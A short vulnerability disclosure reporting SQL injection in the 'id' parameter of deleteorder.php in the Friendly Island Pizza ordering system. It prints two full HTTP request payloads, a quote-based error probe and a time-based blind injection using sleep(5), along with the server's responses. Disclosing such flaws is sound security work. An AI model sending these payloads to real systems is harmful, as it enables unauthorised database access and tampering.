# Friendly Island Pizza Website and Ordering System v1.0 has SQL injection

BUG_Author: a-xsg

Vulnerability File: /friendlyispizzawebsite/deleteorder.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=1'

```
GET /friendlyispizzawebsite/deleteorder.php?id=1%27 HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=aql7l22ttmd7fs98jtsq05lc6p
Connection: close
```

An error occurred in the sql statement

![image](https://github.com/a-xsg/bug_report/blob/main/vendors/picture/error.png)

Payload2:id=1' and (select 1 from (select(sleep(5)))a)-- 

```
GET /friendlyispizzawebsite/deleteorder.php?id=1%27%20and%20(select%201%20from%20(select(sleep(5)))a)--%20a HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=aql7l22ttmd7fs98jtsq05lc6p
Connection: close
```

Server response time is 5 seconds

![image](https://github.com/a-xsg/bug_report/blob/main/vendors/picture/sleep.png)
